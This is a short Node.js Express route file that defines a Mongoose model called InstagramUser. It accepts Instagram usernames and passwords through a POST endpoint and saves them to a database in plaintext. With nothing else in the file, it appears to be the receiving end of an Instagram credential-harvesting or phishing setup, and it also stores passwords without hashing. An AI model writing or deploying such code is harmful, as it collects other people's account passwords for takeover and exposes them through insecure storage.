const express = require('express');
const mongoose = require('mongoose');

const router = express.Router();

// Define a simple schema
const InstagramUserSchema = new mongoose.Schema({
    username: { type: String, required: true },
    password: { type: String, required: true }
});

const InstagramUser = mongoose.model('InstagramUser', InstagramUserSchema);

// POST /instagram/save
router.post('/save', async (req, res) => {
    const { username, password } = req.body;
    
    if (!username || !password) {
        return res.status(400).json({ error: 'usernameand password are required' });
    }
    try {
        const user = new InstagramUser({ username, password });
        await user.save();
        res.status(201).json({ message: 'User saved successfully' });
    } catch (err) {
        res.status(500).json({ error: 'Database error' });
    }
});

module.exports = router;